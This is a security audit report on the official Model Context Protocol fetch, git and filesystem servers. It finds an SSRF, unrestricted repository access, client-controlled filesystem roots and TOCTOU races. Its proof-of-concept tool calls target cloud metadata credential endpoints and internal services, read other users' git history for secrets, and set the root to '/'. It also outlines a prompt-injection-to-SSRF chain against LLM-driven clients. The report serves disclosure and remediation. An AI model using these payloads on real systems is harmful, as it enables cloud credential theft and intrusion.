# MCP Official Servers — Security Audit Report

**Target:** `modelcontextprotocol/servers` (https://github.com/modelcontextprotocol/servers)  
**Date:** June 2, 2026  
**Auditor:** Security Research  
**Scope:** `src/fetch`, `src/git`, `src/filesystem`  

---

## Executive Summary

The official Model Context Protocol (MCP) reference servers contain **critical to medium** security vulnerabilities across three server implementations. The most severe finding is a **full SSRF with no mitigations** in the fetch server, enabling cloud metadata theft, internal network scanning, and potential RCE. The git server has **unrestricted filesystem access** when launched without the `--repository` flag, and the filesystem server has a **trust boundary violation** where malicious MCP clients can expand access to the entire filesystem.

| Server | Severity | Finding | Impact |
|--------|----------|---------|--------|
| fetch | **CRITICAL** | Full SSRF — No internal IP/scheme filtering | Cloud credential theft, internal network access |
| git | **HIGH** | Unrestricted repo_path when no --repository flag | Arbitrary file read via any git repo on disk |
| git | **MEDIUM** | Symlink TOCTOU in validate_repo_path | Path restriction bypass |
| filesystem | **MEDIUM** | Malicious client roots override | Full filesystem access via MCP protocol |
| filesystem | **LOW** | TOCTOU between validatePath and file ops | Race condition symlink escape |

---

## Finding #1: Full SSRF in Fetch Server (CRITICAL)

**File:** `src/fetch/src/mcp_server_fetch/server.py`  
**Function:** `fetch_url()` and `call_tool()`  
**CVSS:** 9.1 (Critical)

### Description

The fetch MCP server has **zero protections** against Server-Side Request Forgery. There is:
- No URL scheme validation (only `AnyUrl` pydantic type which allows any scheme)
- No internal/private IP blocking
- No DNS rebinding protection
- No SSRF filter of any kind

The only "protection" is a `robots.txt` check which:
1. Only applies to autonomous calls (not manual prompt fetches)
2. Can be completely disabled with `--ignore-robots-txt` flag
3. Is not a security control (it's a politeness protocol)

### Vulnerable Code

```python
# server.py line ~107
async def fetch_url(
    url: str, user_agent: str, force_raw: bool = False, proxy_url: str | None = None
) -> Tuple[str, str]:
    from httpx import AsyncClient, HTTPError

    async with AsyncClient(proxy=proxy_url) as client:
        try:
            response = await client.get(
                url,                          # <-- ANY URL, no filtering
                follow_redirects=True,        # <-- Can chain redirects to bypass any future filters
                headers={"User-Agent": user_agent},
                timeout=30,
            )
        except HTTPError as e:
            raise McpError(...)
```

The `Fetch` model uses `AnyUrl` from pydantic:
```python
class Fetch(BaseModel):
    url: Annotated[AnyUrl, Field(description="URL to fetch")]
```

`AnyUrl` accepts **any valid URL** including `http://`, `https://`, `file://`, `ftp://`, etc.

### Proof of Concept

**1. AWS Metadata Credential Theft:**
```json
{
  "tool": "fetch",
  "arguments": {
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "max_length": 50000,
    "raw": true
  }
}
```

**2. GCP Metadata Credential Theft:**
```json
{
  "tool": "fetch",
  "arguments": {
    "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "max_length": 50000,
    "raw": true
  }
}
```
Note: GCP requires `Metadata-Flavor: Google` header which httpx won't send, but the endpoint at `169.254.169.254` works without it on some configurations.

**3. Azure Metadata:**
```json
{
  "tool": "fetch",
  "arguments": {
    "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "max_length": 50000,
    "raw": true
  }
}
```

**4. Internal Network Scanning:**
```json
{
  "tool": "fetch",
  "arguments": {
    "url": "http://192.168.1.1/admin",
    "max_length": 50000,
    "raw": true
  }
}
```

**5. Localhost Services (Redis, Elasticsearch, etc.):**
```json
{
  "tool": "fetch",
  "arguments": {
    "url": "http://127.0.0.1:9200/_cat/indices",
    "max_length": 50000,
    "raw": true
  }
}
```

**6. DNS Rebinding Attack:**
An attacker controls a domain that first resolves to a public IP (passing any future DNS checks) then resolves to `169.254.169.254` on the actual fetch. Since `follow_redirects=True` is set, redirect-based bypasses also work.

### Impact

- **Cloud Credential Theft:** Full AWS/GCP/Azure IAM credentials via metadata endpoints
- **Internal Network Access:** Scan and interact with internal services (databases, admin panels, microservices)
- **Data Exfiltration:** Read internal APIs, Kubernetes service accounts, Docker APIs
- **RCE Chain:** SSRF → metadata creds → cloud API access → instance modification → code execution

### Remediation

```python
import ipaddress
from urllib.parse import urlparse
import socket

BLOCKED_SCHEMES = {'file', 'gopher', 'dict', 'ftp', 'ldap'}
BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local / cloud metadata
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
]

def validate_url(url: str) -> None:
    parsed = urlparse(url)
    
    # Block dangerous schemes
    if parsed.scheme.lower() in BLOCKED_SCHEMES:
        raise ValueError(f"Blocked URL scheme: {parsed.scheme}")
    
    # Only allow http/https
    if parsed.scheme.lower() not in ('http', 'https'):
        raise ValueError(f"Only http/https allowed, got: {parsed.scheme}")
    
    # Resolve hostname and check against blocked networks
    try:
        resolved_ips = socket.getaddrinfo(parsed.hostname, None)
        for _, _, _, _, sockaddr in resolved_ips:
            ip = ipaddress.ip_address(sockaddr[0])
            for network in BLOCKED_NETWORKS:
                if ip in network:
                    raise ValueError(f"URL resolves to blocked network: {ip}")
    except socket.gaierror:
        raise ValueError(f"Cannot resolve hostname: {parsed.hostname}")
```

---

## Finding #2: Unrestricted Filesystem Access in Git Server (HIGH)

**File:** `src/git/src/mcp_server_git/server.py`  
**Function:** `validate_repo_path()` and `call_tool()`  
**CVSS:** 7.5 (High)

### Description

When the git MCP server is started **without** the `--repository` flag (which is the common case for multi-repo usage), the `validate_repo_path()` function provides **zero protection**:

```python
def validate_repo_path(repo_path: Path, allowed_repository: Path | None) -> None:
    """Validate that repo_path is within the allowed repository path."""
    if allowed_repository is None:
        return  # No restriction configured  <-- IMMEDIATE RETURN, NO VALIDATION
```

This means any valid git repository on the filesystem can be accessed — including:
- `/etc` (if git-initialized by an attacker)
- User home directories with git repos
- Other application repos with secrets in git history

### Proof of Concept

**Scenario:** Server started with `mcp-server-git` (no -r flag)

```json
{
  "tool": "git_log",
  "arguments": {
    "repo_path": "/home/otheruser/secret-project",
    "max_count": 50
  }
}
```

```json
{
  "tool": "git_show",
  "arguments": {
    "repo_path": "/opt/application/.git",
    "revision": "HEAD"
  }
}
```

**Reading arbitrary git history for secrets:**
```json
{
  "tool": "git_log",
  "arguments": {
    "repo_path": "/var/www/app",
    "max_count": 100
  }
}
```
Then use `git_show` on each commit to extract passwords, API keys, etc. from git history.

### Impact

- **Secret Extraction:** Read git history of any repo on the system (passwords, API keys, tokens)
- **Source Code Theft:** Full source code access to any git repository
- **Information Disclosure:** Understand system architecture, find additional attack vectors
- **Cross-Tenant Access:** In shared hosting, access other users' repositories

### Remediation

The server should **require** the `--repository` flag or alternatively default to only allowing repositories within the user's home directory. The `validate_repo_path` function should never silently allow all paths.

---

## Finding #3: Symlink TOCTOU in Git Server validate_repo_path (MEDIUM)

**File:** `src/git/src/mcp_server_git/server.py`  
**Function:** `validate_repo_path()`  
**CVSS:** 5.9 (Medium)

### Description

The path validation resolves symlinks and checks boundaries, but there's a Time-Of-Check-Time-Of-Use (TOCTOU) gap:

```python
def validate_repo_path(repo_path: Path, allowed_repository: Path | None) -> None:
    if allowed_repository is None:
        return

    try:
        resolved_repo = repo_path.resolve()        # <-- Step 1: Resolves symlinks (CHECK)
        resolved_allowed = allowed_repository.resolve()
    except (OSError, RuntimeError):
        raise ValueError(f"Invalid path: {repo_path}")

    try:
        resolved_repo.relative_to(resolved_allowed)  # <-- Step 2: Validates (CHECK)
    except ValueError:
        raise ValueError(...)
    
    # <-- TOCTOU WINDOW: Between validation and actual git.Repo(repo_path) usage
    # An attacker can swap the symlink target between check and use
```

After `validate_repo_path()` returns, the `call_tool()` handler does:
```python
repo = git.Repo(repo_path)  # <-- Step 3: Actually opens repo (USE)
```

If an attacker has write access to create symlinks, they can:
1. Point symlink to allowed repo (passes validation)
2. Swap symlink to forbidden repo (between check and use)
3. Git operations execute on the forbidden repo

### Impact

- Path restriction bypass when `--repository` flag is used
- Requires local write access to create/modify symlinks (lowers exploitability)

### Remediation

Use the **resolved path** for the actual git.Repo() call, not the original user-provided path:

```python
# After validation, use resolved_repo for operations
repo = git.Repo(resolved_repo)  # Use validated resolved path
```

---

## Finding #4: Client-Controlled Roots Override in Filesystem Server (MEDIUM)

**File:** `src/filesystem/index.ts`  
**Function:** `updateAllowedDirectoriesFromRoots()`  
**CVSS:** 6.5 (Medium)

### Description

The filesystem server allows MCP clients to dynamically update allowed directories via the MCP roots protocol. A malicious or compromised MCP client can set allowed directories to `/` (root), granting full filesystem access:

```typescript
// index.ts - Handles dynamic roots updates
server.server.setNotificationHandler(RootsListChangedNotificationSchema, async () => {
  try {
    const response = await server.server.listRoots();
    if (response && 'roots' in response) {
      await updateAllowedDirectoriesFromRoots(response.roots);  // <-- Trusts client completely
    }
  } catch (error) { ... }
});
```

The `updateAllowedDirectoriesFromRoots` function:
```typescript
async function updateAllowedDirectoriesFromRoots(requestedRoots: Root[]) {
  const validatedRootDirs = await getValidRootDirectories(requestedRoots);
  if (validatedRootDirs.length > 0) {
    allowedDirectories = [...validatedRootDirs];  // <-- REPLACES all allowed dirs with client-provided ones
    setAllowedDirectories(allowedDirectories);
  }
}
```

The `getValidRootDirectories` only checks that paths exist and are directories — it does NOT validate against the original command-line allowed directories.

### Proof of Concept

A malicious MCP client sends a `roots/list_changed` notification, then when the server calls `listRoots()`, responds with:

```json
{
  "roots": [
    { "uri": "file:///", "name": "root" }
  ]
}
```

This sets `allowedDirectories = ["/"]`, giving full filesystem access to all subsequent operations.

### Attack Scenario

1. User starts filesystem server: `mcp-server-filesystem /home/user/project`
2. Malicious MCP client (or compromised LLM-driven client) connects
3. Client declares it supports roots capability
4. On initialization, server calls `listRoots()` — client responds with `["/"]`
5. Server replaces `["/home/user/project"]` with `["/"]`
6. All subsequent file operations have unrestricted access

### Impact

- **Full filesystem read/write** (escalates from restricted directory to entire system)
- **Privilege escalation** within the MCP session
- Particularly dangerous in environments where the MCP client is partially untrusted (e.g., LLM tool-use where prompt injection could trigger this)

### Remediation

The server should validate client-provided roots against the original command-line allowed directories:

```typescript
async function updateAllowedDirectoriesFromRoots(requestedRoots: Root[]) {
  const validatedRootDirs = await getValidRootDirectories(requestedRoots);
  
  // Only accept roots that are within original CLI-specified directories
  const safeRoots = validatedRootDirs.filter(root => 
    originalAllowedDirectories.some(allowed => 
      root.startsWith(allowed + path.sep) || root === allowed
    )
  );
  
  if (safeRoots.length > 0) {
    allowedDirectories = [...safeRoots];
    setAllowedDirectories(allowedDirectories);
  }
}
```

---

## Finding #5: TOCTOU Race in Filesystem validatePath (LOW)

**File:** `src/filesystem/lib.ts`  
**Function:** `validatePath()`  
**CVSS:** 3.7 (Low)

### Description

There's a theoretical race between `validatePath()` resolving symlinks and the subsequent file operation. However, the filesystem server mitigates this significantly with:
- Atomic writes using `rename()` (which doesn't follow symlinks)
- Exclusive create flag (`wx`) for new files
- Two-phase validation (check path + check resolved symlink)

The remaining window is small and requires local write access to exploit. The `writeFileContent` function's atomic rename strategy provides good defense-in-depth.

### Impact

- Theoretical symlink escape between validation and read operations
- Write operations are well-protected by atomic rename
- Requires attacker to have local filesystem write access to create symlinks in the race window

---

## Additional Observations

### Git Server — Argument Injection Defenses (GOOD)

The git server has solid defenses against argument injection:
- All user inputs checked for `-` prefix before passing to git CLI
- `--` separator used in `git_add` to prevent filename injection
- `rev_parse()` called to validate refs exist before diffing/showing

These are well-implemented "defense in depth" measures.

### Fetch Server — robots.txt is NOT Security

The fetch server's README and code treat `robots.txt` as a security boundary. It is not:
- `robots.txt` is a voluntary compliance mechanism for web crawlers
- The `--ignore-robots-txt` flag completely disables it
- Even without the flag, robots.txt from internal hosts often allows all paths
- It provides zero protection against SSRF to non-HTTP services

### Filesystem Server — Path Validation (GOOD)

The filesystem path validation is well-implemented:
- Null byte rejection
- Path normalization before comparison
- Symlink resolution with real path checking
- Prefix attack prevention (checks for `dir + path.sep`, not just `startsWith`)
- Parent directory validation for new files

---

## Risk Matrix

| Finding | Exploitability | Impact | Requires Auth | Network Position |
|---------|---------------|--------|---------------|-----------------|
| #1 SSRF | Easy | Critical | MCP Client Access | Any (via LLM) |
| #2 Unrestricted Git | Easy | High | MCP Client Access | Local |
| #3 Git TOCTOU | Hard | Medium | Local Write + MCP | Local |
| #4 Roots Override | Medium | High | MCP Client Access | Any |
| #5 FS TOCTOU | Hard | Low | Local Write + MCP | Local |

---

## Recommendations

1. **IMMEDIATE (Finding #1):** Add URL scheme allowlist and internal IP blocking to fetch server
2. **HIGH (Finding #2):** Make `--repository` required OR implement default path restrictions in git server  
3. **MEDIUM (Finding #4):** Validate client roots against original CLI directories in filesystem server
4. **LOW (Findings #3, #5):** Document TOCTOU limitations; use resolved paths for operations

---

## Disclosure Notes

These findings are in the **official reference implementation** of MCP servers maintained by the Model Context Protocol organization. Given the wide adoption of these servers in AI development tools (Cursor, Claude Desktop, Kiro, Continue, etc.), vulnerabilities here have significant blast radius.

The fetch server SSRF is particularly dangerous because:
- MCP clients are often controlled by LLMs
- Prompt injection in LLM context can trigger arbitrary tool calls
- A prompt injection → SSRF → cloud metadata chain = **zero-click cloud credential theft**

---

*End of Report*
